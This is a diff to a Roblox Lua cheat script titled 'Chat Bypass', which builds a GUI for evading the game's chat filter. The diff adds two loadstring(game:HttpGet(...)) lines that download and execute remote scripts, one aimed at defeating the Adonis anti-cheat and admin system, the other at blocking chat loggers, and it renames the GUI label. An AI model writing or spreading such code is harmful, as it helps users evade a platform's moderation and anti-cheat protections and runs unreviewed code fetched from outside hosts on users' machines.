@@ -1,3 +1,9 @@
+-- anti adonis
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua"))()
+
+-- anti chat logger
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Anthonys-acl-ANTI-CHAT-LOGGER-7184"))()
+
 local gui = Instance.new("ScreenGui")
 gui.Name = "C hat By pa ss "
 gui.Parent = game.CoreGui
@@ -39,7 +45,7 @@ label.Position = UDim2.new(0, 0, 0, 0)
 label.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
 label.BorderColor3 = Color3.new(0, 0, 0)
 label.BorderSizePixel = 0
-label.Text = " NoName Chat Bypass"
+label.Text = " HXHO Chat Bypass"
 label.TextColor3 = Color3.new(255, 255, 255)
 label.BackgroundTransparency = 0
 label.Font = "BuilderSans"
